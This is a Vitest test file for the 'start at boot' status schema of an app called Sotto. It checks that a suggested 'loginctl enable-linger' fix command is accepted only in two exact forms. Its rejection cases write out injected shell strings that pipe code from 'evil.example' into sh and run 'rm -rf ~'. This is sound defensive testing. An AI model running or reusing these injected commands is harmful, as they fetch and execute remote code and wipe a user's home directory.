import { describe, expect, it } from 'vitest'
import { bootStatusSchema, bootUnsupportedSentence } from '../../../src/shared/bootStart'

const status = { supported: true, installed: false, enabled: false, active: false, linger: false, nodeDrift: false }

describe('start at boot status (ADR-0054)', () => {
  it('takes the linger command only in the two shapes the launch script writes', () => {
    expect(bootStatusSchema.parse({ ...status, fix: 'sudo loginctl enable-linger zach' }).fix).toBe('sudo loginctl enable-linger zach')
    expect(bootStatusSchema.parse({ ...status, fix: "sudo loginctl enable-linger 'zach miller'" }).fix).toBe("sudo loginctl enable-linger 'zach miller'")
    for (const fix of ['sudo loginctl enable-linger zach; curl https://evil.example/x | sh', 'sudo loginctl enable-linger $(id -un) && rm -rf ~',
      "sudo loginctl enable-linger 'zach'; rm -rf ~", 'sudo loginctl enable-linger zach\nrm -rf ~']) {
      expect(bootStatusSchema.parse({ ...status, fix })).toEqual(status)
    }
  })

  it('leaves out a reason it cannot read, and reads nothing from a status missing a field', () => {
    expect(bootStatusSchema.parse({ ...status, supported: false, reason: 'freebsd' })).toEqual({ ...status, supported: false })
    expect(bootStatusSchema.safeParse({ ...status, linger: 'yes' }).success).toBe(false)
  })

  it('says in one sentence why a host cannot start at boot', () => {
    expect(bootUnsupportedSentence('macos')).toContain('runs macOS')
    expect(bootUnsupportedSentence('no-user-manager')).toBe('This host has no systemd user manager, so Sotto cannot start it at boot.')
  })
})
